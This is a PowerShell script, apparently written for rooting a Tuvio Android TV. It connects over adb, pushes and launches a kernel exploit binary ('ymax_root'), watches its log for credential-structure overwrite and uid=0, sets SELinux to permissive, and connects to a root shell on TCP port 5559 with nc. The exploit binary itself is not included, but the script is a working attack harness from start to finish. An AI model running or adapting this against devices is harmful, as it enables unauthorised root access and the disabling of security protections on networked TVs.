# ============================================================================
#  TUVIO TV ROOT - auto-runner for Windows (PowerShell 5.1+, Windows 8/10/11)
#  Usage (PowerShell):
#     .\tvroot.ps1            # full cycle: boot -> push -> wscan -> root+permissive
#     .\tvroot.ps1 -Mode se0  # only SELinux permissive (fast)
#     .\tvroot.ps1 -Mode log  # attach to live log
#     .\tvroot.ps1 -Mode shell# connect to root shell (port 5559)
#     $env:TV = "192.168.1.xxx"; .\tvroot.ps1
#
# Requirements: platform-tools (adb.exe in PATH or next to script), nc.exe
# (optional for -Mode shell)
# ============================================================================

param(
    [ValidateSet("wscan", "se0", "log", "shell")]
    [string]$Mode = "wscan",
    [string]$TV
)

# если IP не задан через -TV или env, спрашиваем интерактивно
if (-not $TV) { $TV = $env:TV }
if (-not $TV) {
    Write-Host "Введите IP адрес телека (Enter = 192.168.1.117):" -ForegroundColor Cyan -NoNewline
    $inp = Read-Host " "
    if ($inp.Trim() -ne "") { $TV = $inp.Trim() } else { $TV = "192.168.1.117" }
}

$ErrorActionPreference = "Continue"

# --- paths ---
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$BinLocal  = Join-Path $ScriptDir "ymax_root_armv7"
$BinTV     = "/data/local/tmp/ymax_root"
$LogTV     = "/data/local/tmp/yscan.log"

# --- fancy helpers ---
function Say($m)  { Write-Host "[*] $m" -ForegroundColor Cyan }
function Ok($m)   { Write-Host "[+] $m" -ForegroundColor Green }
function Warn($m) { Write-Host "[!] $m" -ForegroundColor Yellow }
function Die($m)  { Write-Host "[x] $m" -ForegroundColor Red; exit 1 }

function ADB { & adb -s "$($TV):5555" @args }

# ==========================================================================
# 0. adb kill-server / reconnect / wait for boot
# ==========================================================================
function Wait-Boot {
    Say "adb kill-server + restart..."
    adb kill-server 2>$null | Out-Null
    adb start-server 2>$null | Out-Null

    Say "waiting for network/adb on $TV..."
    $tries = 0
    while ($true) {
        adb connect "$($TV):5555" 2>$null | Out-Null
        $test = ADB shell true 2>$null
        if ($LASTEXITCODE -eq 0) { break }
        $tries++
        if ($tries -gt 60) { Die "TV unreachable on $TV:5555 after 5 min" }
        Start-Sleep -Seconds 5
    }
    Ok "adb online"

    Say "waiting for full boot..."
    $tries = 0
    while ($true) {
        $bc = (ADB shell getprop sys.boot_completed 2>$null) -join ""
        $bc = $bc.Trim()
        if ($bc -eq "1") { break }
        $tries++
        if ($tries -gt 30) { Die "boot_completed not 1 after 2.5 min" }
        Start-Sleep -Seconds 5
    }
    Ok "boot completed, sleeping 30 s (GPU settle)..."
    Start-Sleep -Seconds 30
    $up = (ADB shell cat /proc/uptime 2>$null) -join ""
    Ok "uptime = $($up.Split(' ')[0]) s"
}

# ==========================================================================
# 1. push binary (bypass "Text file busy")
# ==========================================================================
function Push-Bin {
    if (-not (Test-Path $BinLocal)) {
        Die "binary not found: $BinLocal (see README build line)"
    }
    Say "pushing binary..."
    $out = adb push $BinLocal $BinTV 2>&1
    if ($LASTEXITCODE -ne 0 -or $out -match "Text file busy") {
        Warn "ymax_root busy - pushing as ymax_root_2"
        $script:BinTV = "/data/local/tmp/ymax_root_2"
        adb push $BinLocal $BinTV | Out-Null
        if ($LASTEXITCODE -ne 0) { Die "push failed" }
    }
    Ok "binary at $BinTV"
}

# ==========================================================================
# 2. launch exploit
# ==========================================================================
function Start-Exploit {
    Say "killing stale instances..."
    ADB shell "killall -9 ymax_root 2>/dev/null; killall -9 ymax_root_2 2>/dev/null" | Out-Null
    Start-Sleep -Seconds 2
    ADB shell "rm -f $LogTV" 2>$null | Out-Null
    Say "starting: $Mode"
    ADB shell "nohup $BinTV $Mode > $LogTV 2>&1 &" | Out-Null
    Start-Sleep -Seconds 1
    Ok "launched; watching log..."
}

# ==========================================================================
# 3. tail log with verdicts (incremental via wc -c)
# ==========================================================================
function Watch-Log {
    $last = 0
    $tick = 0
    $lastProgress = 0
    while ($true) {
        $sizeRaw = (ADB shell "stat -c %s $LogTV" 2>$null) -join ""
        $size = 0
        [int]::TryParse($sizeRaw.Trim(), [ref]$size) | Out-Null
        if ($sizeRaw.Trim() -eq "") {
            Die "log disappeared (crash? reboot?) - check: adb shell cat /proc/uptime"
        }
        if ($size -gt $last) {
            $lastProgress = $tick
            $delta = ADB shell "tail -c +$($last + 1) $LogTV" 2>$null
            foreach ($line in $delta) {
                $l = $line -replace '\r', ''
                if ($l -eq "") { continue }
                switch -Regex ($l) {
                    'TARG:'                        { Write-Host $l -ForegroundColor Yellow }
                    'OUR cred found|cred found'    { Write-Host $l -ForegroundColor Yellow }
                    'PERMISSIVE'                   { Write-Host "$l   <- DRAM-confirmed" -ForegroundColor Green }
                    'post-getuid uid=0'            { Write-Host "$l   <- ROOT in process" -ForegroundColor Green }
                    'ROOT SHELL'                   { Write-Host "$l   <- DONE!" -ForegroundColor Green }
                    'tcp-shell listens|'            { Write-Host "$l   <- nc $TV 5559" -ForegroundColor Green }
                    '\[x\]|FAIL'                   { Write-Host $l -ForegroundColor Red }
                    'selinux (pre|RAM|retry)'      { Write-Host $l -ForegroundColor Cyan }
                    '\[W\] === WSCAN'              { Write-Host $l -ForegroundColor Cyan }
                    default                        { Write-Host $l }
                }
            }
            $last = $size
        }

        # verdict on last 3 lines
        $tail = (ADB shell "tail -3 $LogTV" 2>$null) -join "`n"
        if ($tail -match "ROOT SHELL") {
            Write-Host ""
            Ok "=== ROOT SHELL READY: nc $TV 5559 ==="
            exit 0
        }
        if ($tail -match "PERMISSIVE") {
            Ok "permissive confirmed; test: adb shell getenforce"
            exit 0
        }
        if ($tail -match "did not establish|failed to write|PERMISSIVE") { }

        # heartbeat / watchdog
        $tick++
        if (($tick % 15) -eq 0) {
            $alive = (ADB shell "ps -A 2>/dev/null | grep -c ymax_root" 2>$null) -join ""
            if ($alive.Trim() -eq "0") {
                Warn "ymax_root process vanished (log stopped growing)"
                Warn "retry: .\tvroot.ps1 -$Mode"
                exit 1
            }
            if (($tick - $lastProgress) -ge 75) {
                Warn "no log progress for ~5 min - GPU stuck? restart script"
                exit 1
            }
            Say "alive ($alive), log $size bytes..."
        }
        Start-Sleep -Seconds 2
    }
}

# ==========================================================================
# entry
# ==========================================================================
switch ($Mode) {
    "log"   { Watch-Log }
    "shell" {
        Say "connecting: nc $TV 5559 (Ctrl-C to quit)"
        & nc $TV 5559
    }
    "se0"   { Wait-Boot; Push-Bin; Start-Exploit; Watch-Log }
    default { Wait-Boot; Push-Bin; Start-Exploit; Watch-Log }
}
